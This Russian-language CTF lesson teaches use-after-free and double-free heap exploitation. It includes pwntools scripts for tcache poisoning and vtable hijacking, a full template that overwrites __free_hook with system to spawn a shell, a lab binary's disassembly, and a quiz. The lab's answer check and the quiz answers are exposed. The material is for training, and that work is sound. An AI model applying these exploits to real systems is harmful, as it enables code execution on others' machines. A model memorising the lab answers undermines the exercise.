---
id: pwn-heap-uaf
title: "Use-After-Free: эксплуатация освобождённой памяти"
category: pwn
parent: pwn-heap-corruption
difficulty: hard
order: 1
tags: [heap, uaf, use-after-free, double-free, vtable]
prerequisites: [pwn-heap-basics]
useful_for:
  - "CTF Pwn категория"
  - "Эксплуатация heap-уязвимостей"
  - "Browser exploitation"
estimated_minutes: 60
summary: "Разбираем use-after-free и double-free: как освобождённый объект переиспользуется, как захватить управление через vtable/указатели функций и построить RCE."
lab:
  kind: shell
  title: "Практика: reuse после free"
  toolset: [core, objdump]
  workdir: /home/student/task
  files: [task.md, uaf.c, uaf, run.txt]
  check: "grep -q 'reuse=yes' answer.txt"
  hints:
    - "`cat uaf.c` — free(o), но указатель остаётся живым."
    - "`cat run.txt` — адрес `o` и новый `malloc(0x40)`."
    - "Сравни адреса: они совпадают?"
    - "Запиши `reuse=yes` (или `reuse=no`)."
---

## Вопрос, с которого всё начинается

В прошлом уроке мы разобрали устройство кучи: чанки, tcache, метаданные. Но как из этого получается контроль над программой?

Представь: программа освобождает объект, но **забывает занулить указатель**. Память возвращена аллокатору — но указатель всё ещё «жив». Если программу заставить использовать этот указатель, она обратится к памяти, которую мы уже контролируем. Это **use-after-free** — UAF.

## Наш пример: объект с указателем на функцию

```c
struct obj { void (*cb)(void); char data[0x30]; };

struct obj *o = malloc(sizeof(struct obj));
o->cb = handler;
free(o);
// ... позже ...
o->cb();              // UAF: вызов по указателю из освобождённой памяти
```

Освободив `o`, программа сохранила указатель и позже использует его. Аллокатор уже поместил чанк в tcache, и первые байты данных перезаписаны служебными `fd`/`key`. Если мы контролируем, что попадёт в освобождённый чанк, мы контролируем `cb`.

## Шаг 1. Как возникает UAF

| Сценарий | Описание |
|---|---|
| dangling pointer | указатель не занулили после free |
| double-free | free дважды |
| realloc | старый указатель используется после realloc |
| object lifetime | C++ объект используется после delete |
| error path | ветка ошибки освобождает, но продолжает работу |

Общий знаменатель: указатель остаётся валидным, а память — нет.

## Шаг 2. UAF на чанке: перезапись метаданных

Если есть UAF на освобождённый чанк и возможность записать туда данные, можно переписать `fd` и устроить **tcache poisoning**. Либо, если чанк в unsorted bin, переписать `bk` и получить запись по адресу (unsorted bin attack).

```python
from pwn import *
p = process('./chall')
# alloc A, free A, edit A (UAF) -> перезапись fd
p.sendlineafter(b'> ', b'3')       # edit
p.sendlineafter(b'idx: ', b'0')
p.sendline(p64(target))            # пишем target в fd
```

## Шаг 3. UAF на объекте: подмена указателя на функцию

Если освобождённый объект содержит указатель на функцию, а аллокатор переиспользует чанк под контролируемые данные, следующий вызов `o->cb()` прыгнет туда, куда мы запишем:

```c
struct obj *a = malloc(0x40);
a->cb = good;
free(a);
char *b = malloc(0x40);   // вернёт тот же чанк
strcpy(b, p64(win));      // перезаписываем cb
// позже a->cb() -> win
```

Ключевое условие: размеры должны совпасть (округлённо до 0x10), чтобы аллокатор вернул тот же чанк.

## Шаг 4. UAF на C++ объекте с vtable

Классика — объект с **vtable** (таблицей виртуальных функций). Первые 8 байт такого объекта — указатель на vtable:

```cpp
class Animal { public: virtual void speak(); };
Animal *a = new Animal();
delete a;                 // объект освобождён
a->speak();               // UAF: vtable читается из освобождённой памяти
```

Эксплойт: через другой аллоцируемый объект того же размера записываем туда свой указатель на **фейковую vtable**, где лежит адрес `system`/гаджета. Следующий вызов `speak()` прыгнет по нашему указателю:

```python
payload = p64(fake_vtable)     # первый qword объекта = vtable
edit(new_obj, payload)
edit(vtable_obj, p64(win))     # в fake_vtable кладём win
# вызвать speak() -> прыжок на win
```

## Шаг 5. UAF + tcache: полный примитив

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

p = process('./chall')
# 1) alloc/free с UAF для утечки libc (unsorted bin)
alloc(p, 0x500)
free(p, 0)
edit(p, 0, b'A'*8)
libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ecbe0
# 2) tcache poisoning через UAF
alloc(p, 0x40); alloc(p, 0x40)
free(p, 1); free(p, 2)
edit(p, 1, p64(libc.symbols['__free_hook'] ^ (chunk1 >> 12)))
alloc(p, 0x40); alloc(p, 0x40, p64(libc.symbols['system']))
# 3) free('/bin/sh')
alloc(p, 0x40, b'/bin/sh\x00'); free(p, 3)
p.interactive()
```

На glibc ≥ 2.34 хуки удалены — целься в FSOP (`_IO_list_all`) или `.fini_array`.

## Шаг 6. UAF в ядре и браузере

UAF — доминирующий класс уязвимостей в ядрах (объекты `msg_msg`, `pipe_buffer`, `nftables`) и браузерах (объекты JS/JIT). В ядре UAF даёт overlap двух объектов разного типа: читаешь/пишешь через один, манипулируя другим. В браузере UAF на JIT-объекте позволяет подменить указатель на код. Подробнее — в `pwn-kernel-heap` и `pwn-browser`.

## Шаг 7. Обнаружение UAF при отладке

```bash
$ gcc -fsanitize=address -g chall.c -o chall_asan   # ASan
$ ./chall_asan
$ valgrind --tool=memcheck ./chall                   # Valgrind
```

В pwndbg смотри `heap` до и после освобождения: чанк, помеченный `Free chunk (tcache)`, при следующем `malloc` того же размера вернётся снова. Если программа использует старый указатель, он указывает на тот же адрес.

## Влияние митигаций

| Митигация | Влияние |
|---|---|
| safe-linking | усложняет запись `fd` |
| tcache key | ловит double-free, не UAF |
| MTE (ARM64) | ловит UAF аппаратно |
| ASan | ловит при отладке |
| hardened allocators (scudo) | меняют раскладку |

## UAF в связке с format string и переполнением

UAF редко используется в одиночку. Часто он комбинируется: переполнение испортило размер соседнего чанка (overlap), затем UAF даёт доступ к перекрытому объекту; format string утекает адреса, а UAF перезаписывает метаданные. Такая комбинация позволяет решать задачи, где каждая уязвимость по отдельности «недостаточна».

Например: format string утекает heap-базу (нужную для обхода safe-linking), а UAF предоставляет запись в освобождённый чанк. Или переполнение создаёт overlap двух чанков, а UAF на одном из них позволяет переписать указатель в другом. При анализе всегда ищи, что именно освобождается и что может занять это место — и какие ещё примитивы есть в программе, чтобы их скомбинировать.

## На что смотреть дальше

- **Проверка «освобождён ли»** — некоторые аллокаторы зануляют указатель.
- **Размер чанка** — для переиспользования размеры должны совпасть.
- **Safe-linking** — запись `fd` требует heap base.
- **Срок жизни** — UAF работает, пока чанк не переиспользован; тайминг важен.
- **UAF редко в одиночку** — комбинируется с переполнением и format string.
- **ASan мешает** — на цели его обычно нет, но при отладке он ловит UAF.

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

### Рабочий пример (как в лаборатории)

```
$ objdump -d uaf

src/uaf:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64
    1004:	48 83 ec 08          	sub    $0x8,%rsp
    1008:	48 8b 05 c1 2f 00 00 	mov    0x2fc1(%rip),%rax        # 3fd0 <__gmon_start__>
    100f:	48 85 c0             	test   %rax,%rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   *%rax
    1016:	48 83 c4 08          	add    $0x8,%rsp
    101a:	c3                   	ret

Disassembly of section .plt:

0000000000001020 <free@plt-0x10>:
    1020:	ff 35 ca 2f 00 00    	push   0x2fca(%rip)        # 3ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	ff 25 cc 2f 00 00    	jmp    *0x2fcc(%rip)        # 3ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000001030 <free@plt>:
    1030:	ff 25 ca 2f 00 00    	jmp    *0x2fca(%rip)        # 4000 <free@GLIBC_2.2.5>
    1036:	68 00 00 00 00       	push   $0x0
    103b:	e9 e0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001040 <puts@plt>:
    1040:	ff 25 c2 2f 00 00    	jmp    *0x2fc2(%rip)        # 4008 <puts@GLIBC_2.2.5>
    1046:	68 01 00 00 00       	push   $0x1
    104b:	e9 d0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001050 <setbuf@plt>:
    1050:	ff 25 ba 2f 00 00    	jmp    *0x2fba(%rip)        # 4010 <setbuf@GLIBC_2.2.5>
    1056:	68 02 00 00 00       	push   $0x2
    105b:	e9 c0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001060 <printf@plt>:
    1060:	ff 25 b2 2f 00 00    	jmp    *0x2fb2(%rip)        # 4018 <printf@GLIBC_2.2.5>
    1066:	68 03 00 00 00       	push   $0x3
    106b:	e9 b0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001070 <malloc@plt>:
    1070:	ff 25 aa 2f 00 00    	jmp    *0x2faa(%rip)        # 4020 <malloc@GLIBC_2.2.5>
    1076:	68 04 00 00 00       	push   $0x4
    107b:	e9 a0 ff ff ff       	jmp    1020 <_init+0x20>

Disassembly of section .text:

0000000000001080 <_start>:
    1080:	f3 0f 1e fa          	endbr64
    1084:	31 ed                	xor    %ebp,%ebp
    1086:	49 89 d1             	mov    %rdx,%r9
    1089:	5e                   	pop    %rsi
    108a:	48 89 e2             	mov    %rsp,%rdx
    108d:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    1091:	50                   	push   %rax
    1092:	54                   	push   %rsp
    1093:	45 31 c0             	xor    %r8d,%r8d
    1096:	31 c9                	xor    %ecx,%ecx
    1098:	48 8d 3d 06 01 00 00 	lea    0x106(%rip),%rdi        # 11a5 <main>
    109f:	ff 15 1b 2f 00 00    	call   *0x2f1b(%rip)        # 3fc0 <__libc_start_main@GLIBC_2.34>
    10a5:	f4                   	hlt
    10a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    10ad:	00 00 00 

00000000000010b0 <deregister_tm_clones>:
    10b0:	48 8d 3d 81 2f 00 00 	lea    0x2f81(%rip),%rdi        # 4038 <stdout@GLIBC_2.2.5>
    10b7:	48 8d 05 7a 2f 00 00 	lea    0x2f7a(%rip),%rax        # 4038 <stdout@GLIBC_2.2.5>
    10be:	48 39 f8             	cmp    %rdi,%rax
    10c1:	74 15                	je     10d8 <deregister_tm_clones+0x28>
    10c3:	48 8b 05 fe 2e 00 00 	mov    0x2efe(%rip),%rax        # 3fc8 <_ITM_deregisterTMCloneTable>
    10ca:	48 85 c0             	test   %rax,%rax
    10cd:	74 09                	je     10d8 <deregister_tm_clones+0x28>
    10cf:	ff e0                	jmp    *%rax
    10d1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    10d8:	c3                   	ret
    10d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000010e0 <register_tm_clones>:
    10e0:	48 8d 3d 51 2f 00 00 	lea    0x2f51(%rip),%rdi        # 4038 <stdout@GLIBC_2.2.5>
    10e7:	48 8d 35 4a 2f 00 00 	lea    0x2f4a(%rip),%rsi        # 4038 <stdout@GLIBC_2.2.5>
    10ee:	48 29 fe             	sub    %rdi,%rsi
    10f1:	48 89 f0             	mov    %rsi,%rax
    10f4:	48 c1 ee 3f          	shr    $0x3f,%rsi
    10f8:	48 c1 f8 03          	sar    $0x3,%rax
    10fc:	48 01 c6             	add    %rax,%rsi
    10ff:	48 d1 fe             	sar    $1,%rsi
    1102:	74 14                	je     1118 <register_tm_clones+0x38>
    1104:	48 8b 05 cd 2e 00 00 	mov    0x2ecd(%rip),%rax        # 3fd8 <_ITM_registerTMCloneTable>
    110b:	48 85 c0             	test   %rax,%rax
    110e:	74 08                	je     1118 <register_tm_clones+0x38>
    1110:	ff e0                	jmp    *%rax
    1112:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    1118:	c3                   	ret
    1119:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001120 <__do_global_dtors_aux>:
    1120:	f3 0f 1e fa          	endbr64
    1124:	80 3d 15 2f 00 00 00 	cmpb   $0x0,0x2f15(%rip)        # 4040 <completed.0>
    112b:	75 33                	jne    1160 <__do_global_dtors_aux+0x40>
    112d:	55                   	push   %rbp
    112e:	48 83 3d aa 2e 00 00 	cmpq   $0x0,0x2eaa(%rip)        # 3fe0 <__cxa_finalize@GLIBC_2.2.5>
    1135:	00 
    1136:	48 89 e5             	mov    %rsp,%rbp
    1139:	74 0d                	je     1148 <__do_global_dtors_aux+0x28>
    113b:	48 8b 3d ee 2e 00 00 	mov    0x2eee(%rip),%rdi        # 4030 <__dso_handle>
    1142:	ff 15 98 2e 00 00    	call   *0x2e98(%rip)        # 3fe0 <__cxa_finalize@GLIBC_2.2.5>
    1148:	e8 63 ff ff ff       	call   10b0 <deregister_tm_clones>
    114d:	c6 05 ec 2e 00 00 01 	movb   $0x1,0x2eec(%rip)        # 4040 <completed.0>
    1154:	5d                   	pop    %rbp
    1155:	c3                   	ret
    1156:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    115d:	00 00 00 
    1160:	c3                   	ret
    1161:	0f 1f 40 00          	nopl   0x0(%rax)
    1165:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
    116c:	00 00 00 00 

0000000000001170 <frame_dummy>:
    1170:	f3 0f 1e fa          	endbr64
    1174:	e9 67 ff ff ff       	jmp    10e0 <register_tm_clones>

0000000000001179 <real>:
    1179:	55                   	push   %rbp
    117a:	48 89 e5             	mov    %rsp,%rbp
    117d:	48 8d 05 84 0e 00 00 	lea    0xe84(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
    1184:	48 89 c7             	mov    %rax,%rdi
    1187:	e8 b4 fe ff ff       	call   1040 <puts@plt>
    118c:	90                   	nop
    118d:	5d                   	pop    %rbp
    118e:	c3                   	ret

000000000000118f <fake>:
    118f:	55                   	push   %rbp
    1190:	48 89 e5             	mov    %rsp,%rbp
    1193:	48 8d 05 75 0e 00 00 	lea    0xe75(%rip),%rax        # 200f <_IO_stdin_used+0xf>
    119a:	48 89 c7             	mov    %rax,%rdi
    119d:	e8 9e fe ff ff       	call   1040 <puts@plt>
    11a2:	90                   	nop
    11a3:	5d                   	pop    %rbp
    11a4:	c3                   	ret

00000000000011a5 <main>:
    11a5:	55                   	push   %rbp
    11a6:	48 89 e5             	mov    %rsp,%rbp
    11a9:	48 83 ec 10          	sub    $0x10,%rsp
    11ad:	48 8b 05 84 2e 00 00 	mov    0x2e84(%rip),%rax        # 4038 <stdout@GLIBC_2.2.5>
    11b4:	be 00 00 00 00       	mov    $0x0,%esi
    11b9:	48 89 c7             	mov    %rax,%rdi
    11bc:	e8 8f fe ff ff       	call   1050 <setbuf@plt>
    11c1:	bf 40 00 00 00       	mov    $0x40,%edi
    11c6:	e8 a5 fe ff ff       	call   1070 <malloc@plt>
    11cb:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    11cf:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11d3:	48 8d 15 9f ff ff ff 	lea    -0x61(%rip),%rdx        # 1179 <real>
    11da:	48 89 10             	mov    %rdx,(%rax)
    11dd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11e1:	48 8b 10             	mov    (%rax),%rdx
    11e4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11e8:	48 8d 0d 2a 0e 00 00 	lea    0xe2a(%rip),%rcx        # 2019 <_IO_stdin_used+0x19>
    11ef:	48 89 c6             	mov    %rax,%rsi
    11f2:	48 89 cf             	mov    %rcx,%rdi
    11f5:	b8 00 00 00 00       	mov    $0x0,%eax
    11fa:	e8 61 fe ff ff       	call   1060 <printf@plt>
    11ff:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1203:	48 89 c7             	mov    %rax,%rdi
    1206:	e8 25 fe ff ff       	call   1030 <free@plt>
    120b:	48 8d 05 16 0e 00 00 	lea    0xe16(%rip),%rax        # 2028 <_IO_stdin_used+0x28>
    1212:	48 89 c7             	mov    %rax,%rdi
    1215:	e8 26 fe ff ff       	call   1040 <puts@plt>
    121a:	bf 40 00 00 00       	mov    $0x40,%edi
    121f:	e8 4c fe ff ff       	call   1070 <malloc@plt>
    1224:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1228:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    122c:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
    1230:	75 09                	jne    123b <main+0x96>
    1232:	48 8d 05 16 0e 00 00 	lea    0xe16(%rip),%rax        # 204f <_IO_stdin_used+0x4f>
    1239:	eb 07                	jmp    1242 <main+0x9d>
    123b:	48 8d 05 11 0e 00 00 	lea    0xe11(%rip),%rax        # 2053 <_IO_stdin_used+0x53>
    1242:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    1246:	48 8d 3d 0b 0e 00 00 	lea    0xe0b(%rip),%rdi        # 2058 <_IO_stdin_used+0x58>
    124d:	48 89 c2             	mov    %rax,%rdx
    1250:	48 89 ce             	mov    %rcx,%rsi
    1253:	b8 00 00 00 00       	mov    $0x0,%eax
    1258:	e8 03 fe ff ff       	call   1060 <printf@plt>
    125d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1261:	48 8d 15 27 ff ff ff 	lea    -0xd9(%rip),%rdx        # 118f <fake>
    1268:	48 89 10             	mov    %rdx,(%rax)
    126b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    126f:	48 8b 00             	mov    (%rax),%rax
    1272:	48 8d 15 0f 0e 00 00 	lea    0xe0f(%rip),%rdx        # 2088 <_IO_stdin_used+0x88>
    1279:	48 89 c6             	mov    %rax,%rsi
    127c:	48 89 d7             	mov    %rdx,%rdi
    127f:	b8 00 00 00 00       	mov    $0x0,%eax
    1284:	e8 d7 fd ff ff       	call   1060 <printf@plt>
    1289:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    128d:	48 8b 00             	mov    (%rax),%rax
    1290:	ff d0                	call   *%rax
    1292:	b8 00 00 00 00       	mov    $0x0,%eax
    1297:	c9                   	leave
    1298:	c3                   	ret

Disassembly of section .fini:

000000000000129c <_fini>:
    129c:	f3 0f 1e fa          	endbr64
    12a0:	48 83 ec 08          	sub    $0x8,%rsp
    12a4:	48 83 c4 08          	add    $0x8,%rsp
    12a8:	c3                   	ret
```

Подсказка из лаборатории: `objdump -d <файл>`.

## Что мы теперь знаем

- UAF — обращение к освобождённой памяти через живой указатель.
- Освобождённый чанк переиспользуется объектом того же размера.
- UAF на объекте с указателем функции/vtable даёт контроль RIP.
- UAF на чанке даёт tcache poisoning или unsorted leak.
- double-free даёт две аллокации по одному адресу (overlap).

Запомни формулу: **UAF — это не баг, а дверь.** Победу приносит не само обращение к освобождённой памяти, а объект, который ты в неё внесёшь. Поэтому, найдя UAF, сразу думай: какой объект того же размера я могу разместить здесь и как его содержимое превращается в примитив.

## Квиз

Проверь себя.

```quiz
- question: "Что такое use-after-free?"
  options:
    - "Использование указателя на освобождённую память"
    - "Переполнение стека"
    - "Утечка canary"
    - "Обход ASLR"
  answer: 0
  explanation: "UAF — обращение к уже освобождённому объекту через живой указатель."
- question: "Как UAF превращается в контроль потока управления?"
  options:
    - "Освобождённый слот занимает контролируемый объект, и старый указатель вызывает его указатель функции/vtable"
    - "Через ASLR"
    - "Через canary"
    - "Через GOT всегда"
  answer: 0
  explanation: "Перезаписав указатель на функцию/vtable в переиспользованном слоте, получают hijack."
- question: "Почему double-free полезен?"
  options:
    - "Один чанк выдаётся дважды -> перекрытие"
    - "Он отключает NX"
    - "Он снимает canary"
    - "Он включает JIT"
  answer: 0
  explanation: "Двойное освобождение даёт две аллокации по одному адресу."
- question: "Зачем нужен grooming перед UAF-эксплойтом?"
  options:
    - "Чтобы освобождённый слот занял именно контролируемый объект"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить GOT"
  answer: 0
  explanation: "Grooming гарантирует, что нужный объект ляжет в освобождённый слот."
- question: "Какая цель для hijack актуальна на glibc 2.34+?"
  options:
    - "FSOP/_IO_list_all (хуки удалены)"
    - "__free_hook"
    - "__malloc_hook"
    - "canary"
  answer: 0
  explanation: "После удаления хуков используют FSOP и другие цели."
```

## Куда дальше

В `pwn-heap-fengshui` мы разберём **heap grooming** — искусство раскладывать чанки так, чтобы нужный объект лёг именно туда, куда нам надо. А пока главное: **UAF — не баг сам по себе, а дверь; важно, какой объект ты внесёшь в освобождённую память.**

## Где пригодится

- **CTF:** Pwn — heap-задачи (основной класс).
- **Bug bounty:** браузеры, сервисы.
- **Пентест:** эксплуатация heap-багов.
- **Работа:** security research.
